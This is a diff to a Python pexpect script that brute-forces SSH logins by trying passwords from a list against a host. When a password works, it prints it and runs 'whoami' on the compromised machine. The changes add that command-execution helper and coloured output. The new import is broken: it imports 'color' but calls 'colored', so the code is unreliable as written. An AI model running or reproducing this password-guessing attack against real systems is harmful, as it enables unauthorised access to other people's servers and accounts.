@@ -1,8 +1,14 @@
 #!/usr/bin/python
 
 import pexpect
+from termcolor import color
 
 PROMPT= ['#','>>>','>','\$']
+
+def send_command(child,command):
+        child.sendline(command)
+        child.expect(PROMPT)
+        print (child.before)
 
 def connect(user,host,password):
 	ssh_key = 'Are you sure you want to continue connecting'
@@ -31,7 +37,8 @@ def main():
 		password = password.strip("\n")
 		try:
 			child = connect(user,host,password)
-			print ("[+] Password For "+user + " Found " + "And The Passsword is: "+ password)
+			print (colored("[+] Password For "+user + " Found " + "And The Passsword is: "+ password, 'green'))
+			send_command(child, 'whoami')
 		except:
-			print ("[-] Password Not Found........!!!!!!!")
+			print (colored("[-] Password Not Found........!!!!!!!", 'red'))
 main() 
